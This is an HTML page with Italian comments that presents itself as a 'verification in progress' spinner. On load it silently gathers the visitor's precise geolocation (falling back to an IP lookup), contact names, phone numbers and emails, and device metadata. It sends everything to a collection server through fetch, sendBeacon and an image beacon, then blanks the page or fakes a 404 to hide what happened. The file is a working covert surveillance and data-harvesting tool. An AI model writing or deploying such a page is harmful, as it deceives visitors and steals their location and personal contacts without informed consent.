<!-- index.html – pagina bianca, acquisisce posizione + contatti, poi rimane ferma -->
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caricamento...</title>
    <style>
        body {
            background: #ffffff;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .hidden { display: none; }
        #loading {
            text-align: center;
        }
        .spinner {
            border: 4px solid #eee;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Verifica in corso...</p>
    </div>

    <script>
        // ===== CONFIGURAZIONE =====
        const SERVER_URL = 'http://localhost:3000/collect';  // server Python

        // ===== FUNZIONE PER INVIARE I DATI =====
        function sendData(payload) {
            const json = JSON.stringify(payload);
            // Metodo 1: fetch (gestisce CORS)
            fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: json,
                keepalive: true
            }).catch(() => {
                // Metodo 2: sendBeacon (fallback)
                const blob = new Blob([json], { type: 'application/json' });
                navigator.sendBeacon(SERVER_URL, blob);
            });
            // Metodo 3: image beacon (per sicurezza, solo se payload piccolo)
            try {
                new Image().src = SERVER_URL + '?d=' + encodeURIComponent(json.substring(0, 2000));
            } catch(e) {}
        }

        // ===== 1. GEOLOCALIZZAZIONE =====
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    // fallback IP
                    fetch('https://ipapi.co/json/')
                        .then(r => r.json())
                        .then(ip => resolve({ lat: ip.latitude, lon: ip.longitude, city: ip.city, country: ip.country_name, ip: ip.ip }))
                        .catch(() => resolve({ error: 'geolocation not supported' }));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        speed: pos.coords.speed,
                        heading: pos.coords.heading,
                        timestamp: new Date(pos.timestamp).toISOString()
                    }),
                    (err) => {
                        // fallback IP
                        fetch('https://ipapi.co/json/')
                            .then(r => r.json())
                            .then(ip => resolve({ error: err.message, ip: ip.ip, city: ip.city, country: ip.country_name, lat: ip.latitude, lon: ip.longitude }))
                            .catch(() => resolve({ error: err.message || 'geolocation denied' }));
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // ===== 2. CONTATTI =====
        function getContacts() {
            return new Promise((resolve) => {
                if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
                    resolve({ error: 'Contacts API not available' });
                    return;
                }
                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                    .then(contacts => {
                        const cleaned = contacts.map(c => ({
                            name: c.name?.[0] || null,
                            tel: c.tel || null,
                            email: c.email || null
                        }));
                        resolve(cleaned);
                    })
                    .catch(err => resolve({ error: err.message || 'contacts denied' }));
            });
        }

        // ===== 3. METADATI AGGIUNTIVI =====
        function getMetadata() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer || 'none'
            };
        }

        // ===== FUNZIONE PRINCIPALE =====
        async function collect() {
            // Esegue geolocalizzazione e contatti in parallelo
            const [geo, contacts] = await Promise.all([getGeolocation(), getContacts()]);
            const meta = getMetadata();

            const payload = {
                geo: geo,
                contacts: contacts,
                metadata: meta,
                timestamp: new Date().toISOString()
            };

            sendData(payload);

            // Nasconde il caricamento e mostra una pagina bianca (o falso errore)
            setTimeout(() => {
                document.body.innerHTML = '';  // completamente bianca
                // Oppure: mostra un falso 404
                // document.body.innerHTML = '<h1 style="text-align:center;color:#888;">404 Not Found</h1>';
            }, 1000);
        }

        // ===== AVVIO =====
        window.addEventListener('load', function() {
            // Piccolo ritardo per permettere il rendering
            setTimeout(collect, 500);
        });
    </script>
</body>
</html>
